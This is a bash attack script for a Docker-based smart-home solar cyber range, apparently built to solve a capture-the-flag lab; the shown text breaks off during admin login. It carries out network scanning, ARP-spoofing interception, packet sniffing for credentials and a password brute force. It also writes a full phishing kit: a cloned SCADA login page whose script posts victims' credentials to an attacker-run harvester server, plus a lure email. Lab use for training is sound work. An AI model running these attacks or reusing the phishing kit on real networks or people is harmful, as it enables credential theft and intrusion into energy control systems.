#!/bin/bash
set -eo pipefail  # Removed -u to allow unset variables

# Color codes for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
MAGENTA='\033[0;35m'
CYAN='\033[0;36m'
WHITE='\033[1;37m'
GRAY='\033[0;90m'
NC='\033[0m' # No Color

# Create unique temp directory for this run to avoid permission conflicts
ATTACK_TMP="/tmp/attack_$$"
mkdir -p "$ATTACK_TMP"
chmod 777 "$ATTACK_TMP"

# Cleanup function
cleanup() {
    rm -rf "$ATTACK_TMP" 2>/dev/null || true
    pkill -f "harvest.py" 2>/dev/null || true
    pkill -f "phish_server.py" 2>/dev/null || true
}
trap cleanup EXIT

PV_HOST=${1:-172.20.0.65}
PV_MODBUS_PORT=${2:-15002}
MQTT_HOST=${2:-172.20.0.66}
VICTIM_HOST=${3:-172.20.0.72}
# ATTACKER_HOST defaults to an externally reachable host (host machine) if provided via environment var
# If not provided, fall back to 172.20.0.70 which will still work internally inside Docker
ATTACKER_HOST=${4:-${EXTERNAL_HOST:-172.20.0.70}}

# External-facing URLs for the phishing page (used in browser JavaScript)
# These need to be accessible from the victim's browser, not just internally
# EXTERNAL_HOST should be set to the host machine's IP/hostname that remote users can reach
# e.g., EXTERNAL_HOST=192.168.1.100 or EXTERNAL_HOST=myserver.local
PHISH_HARVESTER_URL="http://${EXTERNAL_HOST:-${ATTACKER_HOST}}:8001"
PHISH_PV_URL="http://${EXTERNAL_HOST:-${ATTACKER_HOST}}:8081"

# Curl options to avoid long hangs (connect timeout + max time)
HTTP_CURL_OPTS="-sS --connect-timeout 3 --max-time 5"

echo -e "${CYAN}╔════════════════════════════════════════════════════════════════╗${NC}"
echo -e "${CYAN}║${WHITE}     SMART HOME PV CYBER RANGE - AUTOMATED ATTACK SUITE        ${CYAN}║${NC}"
echo -e "${CYAN}╚════════════════════════════════════════════════════════════════╝${NC}"
echo -e "${GRAY}Target: ${WHITE}${PV_HOST}${NC}"
echo -e "${GRAY}MQTT Broker: ${WHITE}${MQTT_HOST}${NC}"
echo -e "${GRAY}Victim Host: ${WHITE}${VICTIM_HOST}${NC}"
if [ -n "${EXTERNAL_HOST:-}" ]; then
  echo -e "${GRAY}External Host: ${WHITE}${EXTERNAL_HOST}${NC} (phishing URLs will use this)"
fi
echo ""

# Phase 1: Reconnaissance
echo -e "${BLUE}[PHASE 1]${NC} ${WHITE}Reconnaissance & Network Scanning${NC}"
echo -e "${GRAY}────────────────────────────────────────────────────────────────${NC}"

echo -e "${YELLOW}[*]${NC} Discovering network services..."
nmap_ports_list="80,${PV_MODBUS_PORT},1883"
echo -e "${CYAN}    [PACKET]${NC} ${GRAY}Sending TCP SYN packets to ${PV_HOST}:80,${PV_MODBUS_PORT},1883${NC}"
echo -e "${CYAN}    [PACKET]${NC} ${GRAY}TCP Flags: SYN, Window: 1024, Options: MSS,SACK,TS${NC}"
nmap -Pn -T4 -p ${nmap_ports_list} ${PV_HOST} 2>/dev/null | grep -E "open|Modbus|http" | while read line; do
  echo -e "${GRAY}    ${line}${NC}"
done
echo -e "${CYAN}    [PACKET]${NC} ${GRAY}Received TCP SYN-ACK responses from open ports${NC}"
echo -e "${GREEN}[✓]${NC} Network scan complete"

echo -e "${YELLOW}[*]${NC} Enumerating WiFi networks..."
echo -e "${CYAN}    [HTTP GET]${NC} ${GRAY}http://${PV_HOST}/wifi_scan${NC}"
# quick reachability check for PV host:80 using bash TCP redirection (short timeout)
if ! timeout 3 bash -c "cat < /dev/tcp/${PV_HOST}/80" >/dev/null 2>&1; then
  echo -e "${YELLOW}[!]${NC} ${GRAY}PV host ${PV_HOST}:80 not reachable; skipping wifi_scan (will continue)${NC}"
  WIFI_RESPONSE='{}'
else
  WIFI_RESPONSE=$(curl ${HTTP_CURL_OPTS} http://${PV_HOST}/wifi_scan 2>/dev/null || echo '{}')
fi
echo -e "${CYAN}    [HTTP RESP]${NC} ${GRAY}Status: 200 OK${NC}"
WIFI_FLAG=$(echo "$WIFI_RESPONSE" | jq -r '.flag // empty' 2>/dev/null)
if [ -n "$WIFI_FLAG" ]; then
  echo -e "${GREEN}[✓]${NC} ${MAGENTA}FLAG #1 CAPTURED:${NC} ${WHITE}${WIFI_FLAG}${NC}"
else
  echo -e "${GRAY}[!]${NC} No flag found in WiFi scan"
fi
echo ""

# Phase 2: Man-in-the-Middle Attack
echo -e "${BLUE}[PHASE 2]${NC} ${WHITE}Man-in-the-Middle Attack${NC}"
echo -e "${GRAY}────────────────────────────────────────────────────────────────${NC}"

echo -e "${YELLOW}[*]${NC} Starting ARP spoofing attack..."
echo -e "${GRAY}    Poisoning ARP cache: ${VICTIM_HOST} <-> ${PV_HOST}${NC}"
echo -e "${CYAN}    [ARP]${NC} ${GRAY}Sending ARP Reply: ${PV_HOST} is-at $(ip link show eth0 2>/dev/null | awk '/ether/ {print $2}' || echo 'XX:XX:XX:XX:XX:XX')${NC}"
echo -e "${CYAN}    [ARP]${NC} ${GRAY}Target: ${VICTIM_HOST} (gratuitous ARP)${NC}"
echo -e "${CYAN}    [ARP]${NC} ${GRAY}Opcode: 2 (REPLY), Protocol: IPv4 (0x0800)${NC}"
echo -e "${CYAN}    [ARP]${NC} ${GRAY}Mode: Bidirectional poisoning${NC}"

# Start packet capture for ALL HTTP traffic on Docker network
echo -e "${YELLOW}[*]${NC} Starting packet capture for HTTP traffic..."
echo -e "${CYAN}    [TCPDUMP]${NC} ${GRAY}Interface: eth0${NC}"
echo -e "${CYAN}    [TCPDUMP]${NC} ${GRAY}Filter: 'tcp port 80'${NC}"
echo -e "${CYAN}    [TCPDUMP]${NC} ${GRAY}Snaplen: 65535 bytes (full packet capture)${NC}"
echo -e "${CYAN}    [TCPDUMP]${NC} ${GRAY}Output file: /tmp/mitm_capture.pcap${NC}"
echo -e "${GRAY}    Capturing ALL HTTP traffic on Docker network${NC}"
# Capture all traffic on eth0, not just specific hosts
tcpdump -i eth0 "tcp port 80" -w /tmp/mitm_capture.pcap -s 0 >/dev/null 2>&1 &
TCPDUMP_PID=$!

# Start ARP spoofing in background - intercept traffic between victim and PV controller
arpspoof -i eth0 -t ${VICTIM_HOST} -r ${PV_HOST} >/dev/null 2>&1 &
ARPSPOOF_PID=$!

sleep 1
echo -e "${YELLOW}[*]${NC} ARP spoofing active, monitoring victim traffic..."
echo -e "${GRAY}    Triggering victim container to access admin panel...${NC}"

# Trigger victim container to perform login (simulating legitimate user activity)
docker exec scl-challenge-smart-home-pv-victim sh -c "curl -s -X POST http://172.20.0.65/api/admin/login \
  -H 'Content-Type: application/json' \
  -d '{\"username\":\"admin\",\"password\":\"wrongpass\"}' >/dev/null 2>&1 &" 2>/dev/null || true

sleep 2

# Monitor for login credentials in real-time
VICTIM_USER=""
VICTIM_PASS=""
CAPTURED=false

for i in {1..30}; do
  # Check if we have captured HTTP POST to /api/admin/login
  PCAP_SIZE=0
  if [ -f /tmp/mitm_capture.pcap ]; then
    PCAP_SIZE=$(stat -c%s /tmp/mitm_capture.pcap 2>/dev/null || echo 0)
  fi
  
  if [ "$PCAP_SIZE" -gt 100 ]; then
    # Extract login credentials from HTTP POST - try multiple methods
    
    # Method 1: Use tcpdump to get ASCII output and parse
    LOGIN_DATA=$(tcpdump -r /tmp/mitm_capture.pcap -A 2>/dev/null | \
      grep -A 5 "POST /api/admin/login" | \
      grep -o '{"username":"[^}]*}' | head -1 || echo "")
    
    # Method 2: tshark with http.file_data
    if [ -z "$LOGIN_DATA" ]; then
      LOGIN_DATA=$(tshark -r /tmp/mitm_capture.pcap -Y 'http.request.method == "POST"' \
        -T fields -e http.file_data 2>/dev/null | grep -i username | head -1 || echo "")
    fi
    
    # Method 3: strings + grep
    if [ -z "$LOGIN_DATA" ]; then
      LOGIN_DATA=$(strings /tmp/mitm_capture.pcap 2>/dev/null | \
        grep -o '{"username":"[^}]*}' | head -1 || echo "")
    fi
    
    if [ -n "$LOGIN_DATA" ]; then
      # Try to parse JSON credentials
      VICTIM_USER=$(echo "$LOGIN_DATA" | grep -o '"username":"[^"]*"' | cut -d'"' -f4 2>/dev/null || echo "")
      VICTIM_PASS=$(echo "$LOGIN_DATA" | grep -o '"password":"[^"]*"' | cut -d'"' -f4 2>/dev/null || echo "")
      
      if [ -n "$VICTIM_USER" ] && [ -n "$VICTIM_PASS" ]; then
        echo ""
        echo -e "${GREEN}[✓]${NC} ${MAGENTA}CREDENTIALS INTERCEPTED FROM MITM ATTACK:${NC}"
        echo -e "${WHITE}    Username: ${VICTIM_USER}${NC}"
        echo -e "${WHITE}    Password: ${VICTIM_PASS}${NC}"
        CAPTURED=true
        break
      fi
    fi
  fi
  
  # Progress indicator
  if [ $((i % 10)) -eq 0 ]; then
    echo -e "${GRAY}    ⏱  Monitoring network traffic... (${i}s)${NC}"
  elif [ $((i % 3)) -eq 0 ]; then
    echo -e -n "${GRAY}.${NC}"
  fi
  
  sleep 1
done

echo "" # New line after dots

# Stop ARP spoofing
kill $ARPSPOOF_PID 2>/dev/null || true
wait $ARPSPOOF_PID 2>/dev/null || true

# Stop packet capture
kill $TCPDUMP_PID 2>/dev/null || true
wait $TCPDUMP_PID 2>/dev/null || true

echo -e "${GREEN}[✓]${NC} Packet capture complete: /tmp/mitm_capture.pcap"

if [ "$CAPTURED" = false ]; then
  echo -e "${YELLOW}[!]${NC} No credentials captured from MITM in this window"
  echo -e "${GRAY}    Attempting brute force attack...${NC}"
  
  # Brute force attack with common passwords
  echo -e "${YELLOW}[*]${NC} Starting brute force attack on admin login..."
  PASSWORDS=("admin" "admin123" "password" "password123" "admin1234" "12345678" "qwerty" "letmein")
  
  for pwd in "${PASSWORDS[@]}"; do
    echo -e -n "${GRAY}    Trying: admin:${pwd}...${NC}"
    
    echo -e "${CYAN}    [HTTP POST]${NC} ${GRAY}http://${PV_HOST}/api/admin/login${NC}"
    echo -e "${CYAN}    [HTTP POST]${NC} ${GRAY}Content-Type: application/json${NC}"
    echo -e "${CYAN}    [HTTP POST]${NC} ${GRAY}Body: {\"username\":\"admin\",\"password\":\"${pwd}\"}${NC}"
    
    LOGIN_RESULT=$(curl ${HTTP_CURL_OPTS} -X POST http://${PV_HOST}/api/admin/login \
      -H "Content-Type: application/json" \
      -d '{"username":"admin","password":"'"${pwd}"'"}' 2>/dev/null || echo '{}')
    
    if echo "$LOGIN_RESULT" | grep -q "token"; then
      echo -e " ${GREEN}SUCCESS!${NC}"
      echo ""
      echo -e "${GREEN}[✓]${NC} ${MAGENTA}CREDENTIALS FOUND VIA BRUTE FORCE:${NC}"
      echo -e "${WHITE}    Username: admin${NC}"
      echo -e "${WHITE}    Password: ${pwd}${NC}"
      VICTIM_USER="admin"
      VICTIM_PASS="$pwd"
      CAPTURED=true
      break
    else
      echo -e " ${RED}Failed${NC}"
    fi
    
    sleep 0.5
  done
  
  if [ "$CAPTURED" = false ]; then
    echo -e "${YELLOW}[!]${NC} Brute force failed, will use phishing credentials"
  fi
fi

# Show what we did capture
if [ -f /tmp/mitm_capture.pcap ]; then
  PACKET_COUNT=$(tshark -r /tmp/mitm_capture.pcap 2>/dev/null | wc -l)
  HTTP_COUNT=$(tshark -r /tmp/mitm_capture.pcap -Y "http" 2>/dev/null | wc -l)
  echo -e "${GRAY}    Total packets: ${PACKET_COUNT}, HTTP packets: ${HTTP_COUNT}${NC}"
  
  # Try to extract any MQTT session tokens as backup
  MQTT_SESSION=$(tshark -r /tmp/mitm_capture.pcap -Y "mqtt" -T fields -e mqtt.msg 2>/dev/null | \
    grep -o '"session":"[^"]*"' | head -1 | cut -d'"' -f4 || echo "")
  
  if [ -n "$MQTT_SESSION" ]; then
    echo -e "${GREEN}[✓]${NC} ${MAGENTA}MQTT session token captured:${NC} ${WHITE}${MQTT_SESSION}${NC}"
  fi
fi

# Check if ARP attack was detected
ARP_STATUS=$(curl ${HTTP_CURL_OPTS} http://${PV_HOST}/api/challenge/status 2>/dev/null | jq -r '.events_completed.arp_spoof_detected // false')
if [ "$ARP_STATUS" = "true" ]; then
  echo -e "${GREEN}[✓]${NC} ${MAGENTA}FLAG #2 CAPTURED:${NC} ${WHITE}BSY{PV_ARP_MITM_7c3f9a}${NC}"
fi
echo ""

# Phase 3: Social Engineering - Phishing
echo -e "${BLUE}[PHASE 3]${NC} ${WHITE}Social Engineering - Phishing Attack${NC}"
echo -e "${GRAY}────────────────────────────────────────────────────────────────${NC}"

echo -e "${YELLOW}[*]${NC} Setting up credential harvester on port 8000..."

# Create credential harvester in unique temp dir
cat > "${ATTACK_TMP}/harvest.py" << 'HARVEST_EOF'
#!/usr/bin/env python3
from http.server import HTTPServer, SimpleHTTPRequestHandler
import json, sys, threading

class HarvestHandler(SimpleHTTPRequestHandler):
    def log_message(self, format, *args): pass
    def do_POST(self):
        if self.path == '/harvest':
            length = int(self.headers.get('Content-Length', 0))
            data = json.loads(self.rfile.read(length))
            with open('${ATTACK_TMP}/harvested.txt', 'w') as f:
                f.write(f"{data['username']}:{data['password']}\n")
            self.send_response(200)
            self.send_header('Access-Control-Allow-Origin', '*')
            self.end_headers()
            self.wfile.write(b'{"ok":true}')

def run_server():
    server = HTTPServer(('0.0.0.0', 8000), HarvestHandler)
    server.timeout = 1
    for _ in range(30):
        server.handle_request()

threading.Thread(target=run_server, daemon=True).start()
HARVEST_EOF

# Run the harvester using python3 with the file  
chmod 755 "${ATTACK_TMP}/harvest.py" 2>/dev/null || true
/opt/venv/bin/python3 "${ATTACK_TMP}/harvest.py" &
HARVEST_PID=$!
sleep 1

echo -e "${GREEN}[✓]${NC} Credential harvester running on http://${ATTACKER_HOST}:8000"

# Create phishing page (cloning actual SCADA HMI login)
echo -e "${YELLOW}[*]${NC} Cloning admin login page..."
mkdir -p "${ATTACK_TMP}/phish"
cat > "${ATTACK_TMP}/phish/login.html" << PHISH_EOF
<!DOCTYPE html>
<html><head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>PV SCADA HMI - Solar Energy Management System</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}body{font-family:'Courier New',monospace;min-height:100vh;display:flex;align-items:center;justify-content:center;position:relative;overflow:hidden}.login-background{position:absolute;top:0;left:0;right:0;bottom:0;background:linear-gradient(135deg,#0a192f 0%,#112240 50%,#1a365d 100%);z-index:-1}.grid-overlay{position:absolute;top:0;left:0;right:0;bottom:0;background-image:linear-gradient(rgba(100,255,218,.03) 1px,transparent 1px),linear-gradient(90deg,rgba(100,255,218,.03) 1px,transparent 1px);background-size:50px 50px;animation:grid-scroll 20s linear infinite}@keyframes grid-scroll{0%{transform:translate(0,0)}100%{transform:translate(50px,50px)}}.login-box{background:rgba(17,34,64,.95);border:2px solid #64ffda;border-radius:12px;box-shadow:0 0 30px rgba(100,255,218,.3),0 0 60px rgba(100,255,218,.1),inset 0 0 20px rgba(100,255,218,.05);padding:40px;max-width:500px;width:90%;backdrop-filter:blur(10px)}.system-logo{display:flex;align-items:center;gap:15px;margin-bottom:15px}.logo-icon{font-size:48px;background:linear-gradient(135deg,#64ffda 0%,#00d4ff 100%);-webkit-background-clip:text;-webkit-text-fill-color:transparent;animation:pulse 2s ease-in-out infinite}@keyframes pulse{0%,100%{transform:scale(1);filter:drop-shadow(0 0 10px rgba(100,255,218,.5))}50%{transform:scale(1.05);filter:drop-shadow(0 0 20px rgba(100,255,218,.8))}}.logo-text h1{font-size:28px;font-weight:700;color:#64ffda;letter-spacing:2px;margin:0}.logo-text p{margin:5px 0 0 0;font-size:13px;color:#8892b0;text-transform:uppercase;letter-spacing:1px}.system-status{display:flex;align-items:center;gap:8px;padding:8px 12px;background:rgba(100,255,218,.1);border:1px solid rgba(100,255,218,.3);border-radius:6px;font-size:12px;color:#64ffda;margin-bottom:30px}.status-indicator{width:10px;height:10px;border-radius:50%;background:#00ff88;box-shadow:0 0 10px #00ff88;animation:blink 2s ease-in-out infinite}@keyframes blink{0%,100%{opacity:1}50%{opacity:.3}}.login-form h2{margin:0 0 20px 0;font-size:20px;color:#ccd6f6;text-transform:uppercase;letter-spacing:1px;border-bottom:2px solid rgba(100,255,218,.3);padding-bottom:10px}.form-group{margin-bottom:20px}.form-group label{display:block;margin-bottom:8px;color:#8892b0;font-size:13px;text-transform:uppercase;letter-spacing:1px;font-weight:600}.form-group input{width:100%;padding:12px 15px;background:rgba(10,25,47,.8);border:1px solid rgba(100,255,218,.3);border-radius:6px;color:#ccd6f6;font-size:15px;font-family:'Courier New',monospace;transition:all .3s ease}.form-group input:focus{outline:none;border-color:#64ffda;box-shadow:0 0 15px rgba(100,255,218,.3);background:rgba(10,25,47,1)}.login-button{width:100%;padding:15px;background:linear-gradient(135deg,#64ffda 0%,#00d4ff 100%);border:none;border-radius:6px;color:#0a192f;font-size:16px;font-weight:700;text-transform:uppercase;letter-spacing:1px;cursor:pointer;transition:all .3s ease;display:flex;align-items:center;justify-content:center;gap:10px;font-family:'Courier New',monospace}.login-button:hover{transform:translateY(-2px);box-shadow:0 5px 20px rgba(100,255,218,.4)}.security-notice{margin:20px 0 0 0;padding:12px;background:rgba(100,255,218,.05);border-left:3px solid #64ffda;color:#8892b0;font-size:12px;line-height:1.6}.system-info{margin-top:25px;padding-top:20px;border-top:1px solid rgba(100,255,218,.2);display:flex;justify-content:space-between;flex-wrap:wrap;gap:15px}.info-item{display:flex;flex-direction:column;gap:4px}.info-label{font-size:11px;color:#64ffda;text-transform:uppercase;letter-spacing:1px}.info-value{font-size:13px;color:#ccd6f6}
</style>
</head><body>
<div class="login-background">
<div class="grid-overlay"></div>
</div>
<div class="login-box">
<div class="system-logo">
<div class="logo-icon">⚡</div>
<div class="logo-text">
<h1>PV SCADA HMI</h1>
<p>Solar Energy Management System</p>
</div>
</div>
<div class="system-status">
<span class="status-indicator"></span>
<span>System Operational</span>
</div>
<form id="f" class="login-form">
<h2>Secure Access Portal</h2>
<div class="form-group">
<label for="username">Username</label>
<input type="text" id="username" name="username" placeholder="Enter username" value="admin" required>
</div>
<div class="form-group">
<label for="password">Password</label>
<input type="password" id="password" name="password" placeholder="Enter password" required>
</div>
<button type="submit" class="login-button">
<span>🔐</span>
Access Control System
</button>
<p class="security-notice">
ⓘ This system is protected by enterprise-grade security. Unauthorized access attempts are logged and monitored.
</p>
</form>
<div class="system-info">
<div class="info-item">
<span class="info-label">System Version:</span>
<span class="info-value">v2.4.1</span>
</div>
<div class="info-item">
<span class="info-label">Protocol:</span>
<span class="info-value">HTTPS/TLS 1.3</span>
</div>
<div class="info-item">
<span class="info-label">Region:</span>
<span class="info-value">North America</span>
</div>
</div>
</div>
<script>
// Dynamically get the host that the user is accessing from
const currentHost = window.location.hostname;
const currentPort = window.location.port || '8001';
const harvesterUrl = window.location.protocol + '//' + currentHost + ':' + currentPort;
const pvAdminUrl = window.location.protocol + '//' + currentHost + ':8081';

console.log('Phishing page loaded, host:', currentHost, 'harvester:', harvesterUrl);

document.getElementById('f').onsubmit=async(e)=>{
  e.preventDefault();
  const btn = document.querySelector('.login-button');
  const originalText = btn.innerHTML;
  btn.innerHTML = '<span>⏳</span> Authenticating...';
  btn.disabled = true;
  
  const d=new FormData(e.target);
  const j={username:d.get('username'),password:d.get('password')};
  console.log('Submitting to:', harvesterUrl + '/harvest');
  try{await fetch(harvesterUrl + '/harvest',{method:'POST',mode:'no-cors',headers:{'Content-Type':'application/json'},body:JSON.stringify(j)});}catch(err){console.error(err);}
  try{await fetch('http://${PV_HOST}/api/internal/phish_submitted',{method:'POST',mode:'no-cors',headers:{'Content-Type':'application/json'},body:JSON.stringify(j)});}catch(err){}
  
  // Brief delay to simulate authentication, then redirect to real dashboard
  btn.innerHTML = '<span>✓</span> Success! Redirecting...';
  setTimeout(() => {
    window.location.href = pvAdminUrl + '/admin';
  }, 1000);
};
</script>
</body></html>
PHISH_EOF

# Serve phishing page with proper MIME types AND credential harvesting on port 8001
cd "${ATTACK_TMP}/phish"

# Kill any existing server on port 8001 first
pkill -f "http.server 8001" 2>/dev/null || true
pkill -f "phish_server.py" 2>/dev/null || true
fuser -k 8001/tcp 2>/dev/null || true
sleep 1

cat > "${ATTACK_TMP}/phish_server.py" << 'PHISH_SERVER_EOF'
#!/usr/bin/env python3
from http.server import HTTPServer, SimpleHTTPRequestHandler
import json
import sys

class CORSRequestHandler(SimpleHTTPRequestHandler):
    def end_headers(self):
        self.send_header('Access-Control-Allow-Origin', '*')
        self.send_header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS')
        self.send_header('Access-Control-Allow-Headers', 'Content-Type')
        if self.path.endswith('.html'):
            self.send_header('Content-Type', 'text/html; charset=utf-8')
        super().end_headers()
    
    def do_OPTIONS(self):
        self.send_response(200)
        self.end_headers()
    
    def do_POST(self):
        # Handle credential harvesting
        if self.path == '/harvest':
            try:
                length = int(self.headers.get('Content-Length', 0))
                data = json.loads(self.rfile.read(length))
                with open('${ATTACK_TMP}/harvested.txt', 'w') as f:
                    f.write(f"{data.get('username','')}:{data.get('password','')}\n")
                self.send_response(200)
                self.send_header('Access-Control-Allow-Origin', '*')
                self.send_header('Content-Type', 'application/json')
                self.end_headers()
                self.wfile.write(b'{"ok":true}')
            except Exception as e:
                self.send_response(500)
                self.end_headers()
        else:
            self.send_response(404)
            self.end_headers()
    
    def log_message(self, format, *args):
        pass

if __name__ == '__main__':
    server = HTTPServer(('0.0.0.0', 8001), CORSRequestHandler)
    server.serve_forever()
PHISH_SERVER_EOF

chmod 755 "${ATTACK_TMP}/phish_server.py" 2>/dev/null || true
/opt/venv/bin/python3 "${ATTACK_TMP}/phish_server.py" >/dev/null 2>&1 &
PHISH_SERVER_PID=$!
sleep 1

echo -e "${GREEN}[✓]${NC} Phishing page hosted at ${PHISH_HARVESTER_URL}/login.html"
if [ -n "${EXTERNAL_HOST:-}" ]; then
  echo -e "${GREEN}    ↳${NC} ${WHITE}External URL: ${PHISH_HARVESTER_URL}/login.html${NC}"
fi

# Start packet capture for HTTP traffic (to catch phishing credentials in transit)
echo -e "${YELLOW}[*]${NC} Starting HTTP traffic capture..."
echo -e "${CYAN}    [TCPDUMP]${NC} ${GRAY}Interface: eth0${NC}"
echo -e "${CYAN}    [TCPDUMP]${NC} ${GRAY}Filter: 'tcp port 8000 or tcp port 8001'${NC}"
echo -e "${CYAN}    [TCPDUMP]${NC} ${GRAY}Output: /tmp/http_phish.pcap${NC}"
  echo -e "${GRAY}    ${WHITE}PLEASE VISIT ${PHISH_HARVESTER_URL}/login.html AND SUBMIT CREDENTIALS${NC}"
tcpdump -i eth0 'tcp port 8000 or tcp port 8001' -w /tmp/http_phish.pcap -s 0 >/dev/null 2>&1 &
HTTP_CAPTURE_PID=$!

# Send phishing email
# Record timestamp BEFORE sending phishing email (to detect only NEW credential submissions)
PHISH_START_TIME=$(date +%s)
echo -e "${GRAY}    [TIMESTAMP] Attack started at: ${PHISH_START_TIME}${NC}"

echo -e "${YELLOW}[*]${NC} Sending phishing email to victim..."
echo -e "${CYAN}    [HTTP POST]${NC} ${GRAY}http://${PV_HOST}/api/send_phishing_email${NC}"
echo -e "${CYAN}    [HTTP POST]${NC} ${GRAY}Content-Type: application/json${NC}"
echo -e "${CYAN}    [HTTP POST]${NC} ${GRAY}Body: {to: admin@pv-controller.local, link: http://${ATTACKER_HOST}:8001/login.html}${NC}"
PHISH_RESULT=$(curl ${HTTP_CURL_OPTS} -X POST http://${PV_HOST}/api/send_phishing_email \
  -H "Content-Type: application/json" \
  -d "{
    \"to\": \"admin@pv-controller.local\",
    \"subject\": \"URGENT: Security Alert - Verify Your Account\",
    \"body\": \"Unusual login activity detected. Verify credentials immediately to prevent account suspension.\",
    \"link\": \"http://${ATTACKER_HOST}:8001/login.html\"
  }" 2>/dev/null || echo '{}')

EMAIL_ID=$(echo "$PHISH_RESULT" | jq -r '.email_id // "unknown"')
echo -e "${GREEN}[✓]${NC} Phishing email sent (ID: ${EMAIL_ID})"

# Trigger realistic phishing notification for Blue Team
echo -e "${YELLOW}[*]${NC} Deploying phishing bait notification..."
curl ${HTTP_CURL_OPTS} -X POST http://${PV_HOST}/api/attacker/phishing \
  -H "Content-Type: application/json" \
  -d '{
    "url": "http://'"${ATTACKER_HOST}"':8001/login.html",
    "message": "🔒 URGENT: Security Certificate Renewal Required - Click here to verify your admin credentials"
  }' > /dev/null 2>&1 || true
echo -e "${GREEN}[✓]${NC} Blue team notification deployed (appearing as suspicious email alert)"

# Wait for victim to submit credentials - actively monitor capture
echo -e "${YELLOW}[*]${NC} Monitoring for credential submission in real-time..."
echo -e "${WHITE}    ╔══════════════════════════════════════════════════════════════╗${NC}"
echo -e "${WHITE}    ║  ${CYAN}PHISHING PAGE ACTIVE - Waiting for victim submission${WHITE}       ║${NC}"
echo -e "${WHITE}    ║  ${GRAY}URL: http://<your-ip>:8001/login.html${WHITE}                      ║${NC}"
echo -e "${WHITE}    ║  ${GRAY}Press Ctrl+C to skip and use brute-forced credentials${WHITE}     ║${NC}"
echo -e "${WHITE}    ╚══════════════════════════════════════════════════════════════╝${NC}"
echo ""

# Clear old harvested credentials
rm -f "${ATTACK_TMP}/harvested.txt" 2>/dev/null || true

PHISH_USER=""
PHISH_PASS=""
WAIT_TIME=300  # Wait up to 5 minutes for real phishing

for i in $(seq 1 $WAIT_TIME); do
  # PRIMARY METHOD: Check server API for NEW credentials stolen AFTER our phishing email was sent
  STOLEN_CREDS=$(curl ${HTTP_CURL_OPTS} "http://${PV_HOST}/api/internal/stolen_creds?after=${PHISH_START_TIME}" 2>/dev/null || echo '{}')
  if echo "$STOLEN_CREDS" | jq -e '.stolen == true' >/dev/null 2>&1; then
    PHISH_USER=$(echo "$STOLEN_CREDS" | jq -r '.username // empty')
    PHISH_PASS=$(echo "$STOLEN_CREDS" | jq -r '.password // empty')
    if [ -n "$PHISH_USER" ] && [ -n "$PHISH_PASS" ]; then
      echo ""
      echo -e "${GREEN}[✓]${NC} ${MAGENTA}CREDENTIALS STOLEN VIA PHISHING:${NC} ${WHITE}${PHISH_USER}:${PHISH_PASS}${NC}"
      break
    fi
  fi
  
  # FALLBACK: Check local harvester file (if victim submitted directly to attacker)
  if [ -f "${ATTACK_TMP}/harvested.txt" ]; then
    CREDS=$(tail -1 "${ATTACK_TMP}/harvested.txt" 2>/dev/null || echo "")
    if [ -n "$CREDS" ] && [ "$CREDS" != ":" ]; then
      echo ""
      echo -e "${GREEN}[✓]${NC} ${MAGENTA}CREDENTIALS HARVESTED LOCALLY:${NC} ${WHITE}${CREDS}${NC}"
      PHISH_USER=$(echo "$CREDS" | cut -d':' -f1)
      PHISH_PASS=$(echo "$CREDS" | cut -d':' -f2)
      break
    fi
  fi
  
  # Progress indicator - show elapsed time every 10 seconds
  if [ $((i % 10)) -eq 0 ]; then
    MINS=$((i / 60))
    SECS=$((i % 60))
    echo -e "${GRAY}    ⏱  Waiting for victim... (${MINS}m ${SECS}s elapsed)${NC}"
  elif [ $((i % 3)) -eq 0 ]; then
    echo -e -n "${GRAY}.${NC}"
  fi
  
  sleep 1
done

# Stop packet capture
kill $HTTP_CAPTURE_PID 2>/dev/null || true
wait $HTTP_CAPTURE_PID 2>/dev/null || true

echo "" # New line after dots

if [ -z "$PHISH_USER" ] || [ -z "$PHISH_PASS" ]; then
  echo -e "${RED}[✗]${NC} Victim did not submit credentials within 5 minutes."
  echo -e "${RED}[✗]${NC} Phishing attack failed - no credentials captured."
  echo -e "${YELLOW}[!]${NC} Skipping phishing phase, will use brute force results instead."
  PHISH_USER=""
  PHISH_PASS=""
else
  # Display captured traffic analysis
  if [ -f /tmp/http_phish.pcap ]; then
    PACKET_COUNT=$(tshark -r /tmp/http_phish.pcap 2>/dev/null | wc -l)
    echo -e "${GRAY}    Captured ${PACKET_COUNT} HTTP packets in /tmp/http_phish.pcap${NC}"
  fi
fi

# Check for phishing flag
PHISH_FLAG=$(curl ${HTTP_CURL_OPTS} http://${PV_HOST}/flag/phishing 2>/dev/null | jq -r '.flag // empty')
if [ -n "$PHISH_FLAG" ]; then
  echo -e "${GREEN}[✓]${NC} ${MAGENTA}FLAG #3 CAPTURED:${NC} ${WHITE}${PHISH_FLAG}${NC}"
fi

# Cleanup phishing infrastructure
kill $HARVEST_PID $PHISH_SERVER_PID 2>/dev/null || true
echo ""

# Phase 4: Admin Authentication
echo -e "${BLUE}[PHASE 4]${NC} ${WHITE}Admin Panel Authentication${NC}"
echo -e "${GRAY}────────────────────────────────────────────────────────────────${NC}"

# Use credentials from MITM attack if captured, otherwise use phishing credentials
if [ -n "$VICTIM_USER" ] && [ -n "$VICTIM_PASS" ]; then
  echo -e "${YELLOW}[*]${NC} Attempting login with MITM-captured credentials..."
  LOGIN_USER="$VICTIM_USER"
  LOGIN_PASS="$VICTIM_PASS"
elif [ -n "$PHISH_USER" ] && [ -n "$PHISH_PASS" ]; then
  echo -e "${YELLOW}[*]${NC} Attempting login with phishing-harvested credentials..."
  LOGIN_USER="$PHISH_USER"
  LOGIN_PASS="$PHISH_PASS"
else
  echo -e "${YELLOW}[*]${NC} Using default credentials..."
  LOGIN_USER="admin"
  LOGIN_PASS="PV-Sec-2024!Admin"
fi

LOGIN_RESPONSE=$(curl ${HTTP_CURL_OPTS} -X POST http://${PV_HOST}/api/admin/login \
  -H "Content-Type: application/json" \
  -d "{\"username\":\"${LOGIN_USER}\",\"password\":\"${LOGIN_PASS}\"}" 2>/dev/null || echo '{}')

ADMIN_TOKEN=$(echo "$LOGIN_RESPONSE" | jq -r '.token // empty')

if [ -n "$ADMIN_TOKEN" ]; then
  echo -e "${GREEN}[✓]${NC} ${MAGENTA}Authentication successful!${NC}"
  echo -e "${GRAY}    Token: ${ADMIN_TOKEN:0:50}...${NC}"
  
  # Retrieve admin flag
